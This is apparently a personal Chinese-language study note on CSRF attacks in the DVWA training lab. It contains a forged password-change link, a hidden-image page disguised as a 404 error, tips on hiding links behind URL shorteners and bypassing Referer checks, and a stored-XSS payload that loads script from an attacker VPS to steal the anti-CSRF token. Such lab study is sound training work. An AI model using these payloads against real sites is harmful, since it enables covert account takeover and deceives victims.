## dvwa 学习 csrf

### 参考资料

[DVWA-1.9全级别教程之CSRF](https://www.freebuf.com/articles/web/118352.html)

### csrf 简介

利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账 、改密等）。

CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。

### 环境

dvwa 服务器 192.168.255.151:8081

攻击者vps  192.168.1.101

### 攻击步骤

#### 1.编写 payload

```http://192.168.255.151:8081/dvwa-master/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#```

受害者点击链接之后页面会跳转

需要注意，**CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面**

可以使用短链接来隐藏URL（点击短链接，会自动跳转到真实网站）：
如 [百度短链接](https://dwz.cn)

实际攻击场景下只要目标服务器的域名不是ip，是可以生成相应短链接的。

#### 2.构造攻击页面

a) 在公网上传一个攻击页面，诱骗受害者去访问

用隐藏图片的src属性来发起恶意请求

下面是html代码

```

	<img src="http://192.168.255.151:8081/dvwa-master/vulnerabilities/csrf/?password_new=hack&password_conf=hack&Change=Change#" border="0" style="display:none;"/>
	
	<h1>404<h1>
	
	<h2>file not found.<h2>

```

当受害者访问test.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了hack



b) 服务端验证了 host与 referer，使referer必须包含host

应对：构造文件名为 服务器名

可以将攻击页面命名为192.168.255.151.html ，页面放在攻击者vps上。

c) High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。


由于跨域是不能实现的，所以我们要将攻击代码注入到目标服务器192.168.255.151中，才有可能完成攻击

```ALTER TABLE guestbook MODIFY name VARCHAR(190);```


	<img src=# onerror="var b= document.createElement('scr&#x69;pt');
	b.setAttribute('src','http://192.168.1.101:808/g.js');
	document.getElementsByTagName('head')[0].appendChild(b);">

这一步操作和high级别存储型xss一样，如图，获取到token。
![](token.png)


可见csrf要和xss结合使用才能发挥最大效果。  但实际是否会存在一个时间差，获取到token了，如何监控？如何即时诱导用户是以后该思考的问题